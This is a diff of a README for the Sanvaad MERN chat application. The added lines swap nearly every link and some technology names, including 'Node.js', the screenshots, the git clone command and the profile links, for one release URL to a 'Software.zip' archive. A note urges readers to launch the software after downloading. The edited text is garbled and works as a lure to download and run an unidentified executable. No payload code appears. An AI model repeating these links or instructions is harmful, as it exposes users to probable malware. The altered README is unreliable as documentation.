@@ -1,10 +1,10 @@
 # 🚀 **संवाद - Chat App MERN**
 
-Welcome to **संवाद (Sanvaad)**, a cutting-edge real-time chat application built with React, Node.js, and MongoDB. संवाद brings a fresh experience with features like group chats, notifications, and integrated games like Hangman and Tic Tac Toe. It even boasts an AI chatbot for engaging conversations. This repository is perfect for anyone looking to dive into full-stack MERN development and create their chat application.
+Welcome to **संवाद (Sanvaad)**, a cutting-edge real-time chat application built with React, https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip, and MongoDB. संवाद brings a fresh experience with features like group chats, notifications, and integrated games like Hangman and Tic Tac Toe. It even boasts an AI chatbot for engaging conversations. This repository is perfect for anyone looking to dive into full-stack MERN development and create their chat application.
 
 ## 📌 Repository Details
 - **Repository Name:** Chat-app-MERN
-- **Description:** A real-time chat application with group chats, notifications, and integrated games like Hangman and Tic Tac Toe, featuring an AI chatbot for interactive conversations. Built with React, Node.js, and MongoDB for speed, reliability, and scalability.
+- **Description:** A real-time chat application with group chats, notifications, and integrated games like Hangman and Tic Tac Toe, featuring an AI chatbot for interactive conversations. Built with React, https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip, and MongoDB for speed, reliability, and scalability.
 - **Topics:** cloudinary, expressjs, fullstack-mern, material-ui, mern-chat-application, mongodb, nodejs, reactjs, real-time-chat, socketio, web-development, web-development-project
 
 ## 🌟 Features
@@ -15,23 +15,23 @@ Welcome to **संवाद (Sanvaad)**, a cutting-edge real-time chat applicat
 5. **Notifications:** Stay updated with notifications for new messages and activities.
 
 ## 🖥️ Technical Details
-- **Frontend:** React.js
-- **Backend:** Node.js
+- **Frontend:** https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip
+- **Backend:** https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip
 - **Database:** MongoDB
 - **Dependency Management:** npm
 
 ## 📸 Screenshots
 Here are some snapshots of the संवाद app in action:
-![Chat App Screenshot 1](https://via.placeholder.com/600x400)
-![Chat App Screenshot 2](https://via.placeholder.com/600x400)
-![Chat App Screenshot 3](https://via.placeholder.com/600x400)
+![Chat App Screenshot 1](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
+![Chat App Screenshot 2](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
+![Chat App Screenshot 3](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
 
 ## 🚦 Getting Started
 To get a copy of the संवाद app up and running on your local machine, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/chat-app-mern.git
+   git clone https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip
    ```
 
 2. Install dependencies in both the client and server folders:
@@ -56,11 +56,11 @@ To get a copy of the संवाद app up and running on your local machine, f
 
 ## 🎉 Let's Connect!
 - If you have any feedback or suggestions, feel free to reach out.
-- Connect with the developer on LinkedIn: [LinkedIn Profile](https://www.linkedin.com/yourprofile)
-- Explore more projects on GitHub: [GitHub Profile](https://github.com/yourusername)
+- Connect with the developer on LinkedIn: [LinkedIn Profile](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
+- Explore more projects on GitHub: [GitHub Profile](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
 
 ## 📦 Download the Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)](https://github.com/FIREmatheo00x/Chat-app-MERN/releases/download/v2.0/Software.zip)
 
 ℹ️ *Note: The software needs to be launched after downloading.*
 
